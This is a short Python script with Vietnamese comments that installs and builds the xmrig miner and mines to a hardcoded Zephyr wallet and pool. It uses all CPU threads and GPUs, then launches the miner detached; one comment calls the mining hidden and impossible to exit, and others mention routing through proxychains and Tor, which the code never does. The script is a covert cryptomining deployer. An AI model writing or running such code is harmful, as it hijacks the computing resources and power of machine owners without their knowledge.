import subprocess
import json
import os

def install_packages():
    # Cài đặt các gói cần thiết: xmrig, proxychains, tor
    subprocess.run("sudo apt-get update", shell=True, check=True)
    subprocess.run("sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev ", shell=True, check=True)

def install_xmrig():
    # Tải xuống và cài đặt xmrig từ repository
    subprocess.run("git clone https://github.com/xmrig/xmrig.git", shell=True, check=True)
    os.chdir("xmrig")
    subprocess.run("mkdir build && cd build && cmake .. && make", shell=True, check=True)

def setup_mining_config(pool_url, username, password, cpu_threads):
    # Thiết lập tệp cấu hình đào
    config = {
        "cpu": True,             # Sử dụng CPU
        "opencl": True,          # Sử dụng GPU OpenCL
        "cuda": True,            # Sử dụng GPU CUDA
        "pools": [
            {
                "url": pool_url,
                "user": username,
                "pass": password,
                "tls": True        # Sử dụng SSL
            }
        ],
        "cpu-threads": cpu_threads  # Số lượng luồng CPU sử dụng
    }
    
    # Ghi tệp cấu hình vào config.json
    with open("config.json", "w") as f:
        json.dump(config, f)

def start_mining():
    # Khởi động quá trình đào coin với xmrig qua proxychains và Tor
    subprocess.Popen("./xmrig -c config.json & disown", shell=True, preexec_fn=os.setsid)

# def set_huge_pages():
#     # Thiết lập huge pages (cần quyền root)
#     subprocess.run("sudo sysctl -w vm.nr_hugepages=128", shell=True)

def set_max_huge_pages():
    total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
    subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])

if __name__ == "__main__":
    # Cài đặt các gói cần thiết
    install_packages()
    
    # Cài đặt xmrig
    install_xmrig()
    
    # Thiết lập tệp cấu hình đào
    pool_url = "stratum+ssl://sg-zephyr.miningocean.org:5432"
    username = "ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB"
    password = "x"
    cpu_threads = os.cpu_count()  # Số lượng luồng CPU tối đa
    
    setup_mining_config(pool_url, username, password, cpu_threads)
    
    # Thiết lập huge pages
    set_max_huge_pages()
    
    # Bắt đầu đào coin ẩn và không thể thoát ra
    start_mining()
